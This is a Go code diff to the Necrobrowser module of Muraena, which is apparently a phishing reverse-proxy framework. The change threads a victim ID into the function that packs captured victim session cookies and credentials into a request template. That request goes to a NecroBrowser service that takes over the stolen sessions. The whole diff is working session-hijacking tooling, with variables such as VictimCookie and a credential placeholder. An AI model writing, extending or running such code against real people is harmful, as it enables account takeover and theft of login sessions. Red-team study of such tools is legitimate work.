@@ -25,6 +25,7 @@ const (
 	Author = "Muraena Team"
 
 	// Placeholders for templates
+	TrackerPlaceholder = "%%%TRACKER%%%"
 	CookiePlaceholder      = "%%%COOKIES%%%"
 	CredentialsPlaceholder = "%%%CREDENTIALS%%%"
 )
@@ -155,7 +156,7 @@ func (module *Necrobrowser) CheckSessionCookies() {
 
 		// if we find the cookies, and the session has not been already instrumented (== false), then instrument
 		if cookiesNeeded == cookiesFound && !v.SessionInstrumented {
-			module.Instrument(v.Cookies, "[]") // TODO add credentials JSON, instead of passing empty [] array
+			module.Instrument(v.ID, v.Cookies, "[]") // TODO add credentials JSON, instead of passing empty [] array
 			// prevent the session to be instrumented twice
 			_ = db.SetSessionAsInstrumented(v.ID)
 		}
@@ -171,7 +172,11 @@ func Contains(slice *[]string, find string) bool {
 	return false
 }
 
-func (module *Necrobrowser) Instrument(cookieJar []db.VictimCookie, credentialsJSON string) {
+
+
+
+
+func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCookie, credentialsJSON string) {
 
 	var necroCookies []SessionCookie
 	const timeLayout = "2006-01-02 15:04:05 -0700 MST"
@@ -206,6 +211,7 @@ func (module *Necrobrowser) Instrument(cookieJar []db.VictimCookie, credentialsJ
 	}
 
 	cookiesJSON := string(c)
+	module.Request = strings.ReplaceAll(module.Request, TrackerPlaceholder, victimID)
 	module.Request = strings.ReplaceAll(module.Request, CookiePlaceholder, cookiesJSON)
 	module.Request = strings.ReplaceAll(module.Request, CredentialsPlaceholder, credentialsJSON)
 
@@ -224,3 +230,6 @@ func (module *Necrobrowser) Instrument(cookieJar []db.VictimCookie, credentialsJ
 	module.Info("NecroBrowser Response: %+v", resp)
 	return
 }
+
+
+
